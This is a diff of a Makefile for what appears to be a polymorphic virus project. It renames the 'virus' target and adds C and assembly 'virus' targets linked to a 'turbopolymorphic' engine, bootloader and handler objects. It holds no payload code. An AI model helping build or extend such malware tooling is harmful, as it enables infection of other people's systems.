@@ -10,12 +10,24 @@ KFLAGS = -no-pie -nostartfiles
 MFLAGS = -no-pie -r -nostdlib
 all: virus
 
-# C CODE
+# C EXTERNAL
 
-virus: infect.c turbopolymorphic.o
+c_virus: external.c turbopolymorphic.o
 	$(CC) $(KFLAGS) $^ -o $@	
 
-# C CODE
+# C EXTERNAL
+
+# ASM EXTERNAL
+
+asm_virus: external.c turbopolymorphic.o
+	$(CC) $(KFLAGS) $^ -o $@	
+
+external.o: external.asm
+	$(ASM) $(AFLAGS) $< -o $@
+
+# ASM EXTERNAL
+
+
 
 turbopolymorphic.o: polymorphicengine.o polymorphichandler.o bootloader.o
 	$(CC) $(MFLAGS) $^ -o $@
